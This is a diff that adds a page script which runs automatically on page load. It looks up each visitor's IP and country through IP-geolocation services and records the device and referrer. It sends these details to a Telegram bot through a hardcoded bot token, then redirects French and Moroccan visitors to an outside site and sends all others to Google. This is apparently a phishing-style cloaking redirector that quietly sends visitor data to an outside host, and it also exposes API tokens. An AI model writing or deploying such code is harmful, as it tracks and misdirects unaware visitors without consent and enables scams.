@@ -1,0 +1,77 @@
+<script>
+async function sendTelegramNotification({ ip, country, device, ref, destination }) {
+  const botToken = "7931459363:AAGUALDFO52jKgFq-QHLDqY55W-eZ9CrTuI";
+  const chatId = "6635183173";
+  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+  const message = 
+`👁️‍🗨️ *NEW UNITED 3*
+
+🆔 *IP Address:* \`${ip}\`
+🌍 *Country:* _${country}_
+💻 *Device:* ${device}
+🔗 *Referrer:* ${ref}
+
+🕐 *Time:* ${new Date().toLocaleString()}
+🎯 *Destination:* ${destination}`;
+
+  try {
+    fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ chat_id: chatId, text: message, parse_mode: "Markdown" })
+    });
+  } catch (e) {
+    console.error("Telegram error:", e);
+  }
+}
+
+function getDeviceType(ua) {
+  ua = ua.toLowerCase();
+  if (/mobile|android|iphone|ipod|blackberry|windows phone/i.test(ua)) return "Mobile";
+  if (/ipad|tablet|kindle|playbook/i.test(ua)) return "Tablet";
+  return "Desktop";
+}
+
+async function fetchGeoData() {
+  const ipinfoToken = "886fd8489117f1";
+  try {
+    const res = await fetch(`https://ipinfo.io/json?token=${ipinfoToken}`);
+    return await res.json();
+  } catch {
+    try {
+      const fallback = await fetch("https://ipapi.co/json/");
+      return await fallback.json();
+    } catch {
+      return { ip: "Unknown", country: "XX" };
+    }
+  }
+}
+
+async function startRedirect() {
+  const geo = await fetchGeoData();
+  const ip = geo.ip || "Unknown";
+  let countryCode = (geo.country || "XX").trim().toUpperCase();
+
+  if (countryCode === "MOROCCO") countryCode = "MA";
+
+  const ua = navigator.userAgent;
+  const device = getDeviceType(ua);
+  const ref = document.referrer || "Direct";
+
+  const redirectMap = {
+    "FR": "https://caryse.com/novecs/",
+    "MA": "https://caryse.com/novecs/",
+  };
+
+  const destination = redirectMap[countryCode] || "https://google.fr";
+
+  // Send log without blocking redirect
+  sendTelegramNotification({ ip, country: countryCode, device, ref, destination });
+
+  // Redirect immediately
+  window.location.replace(destination);
+}
+
+document.addEventListener("DOMContentLoaded", startRedirect);
+</script>
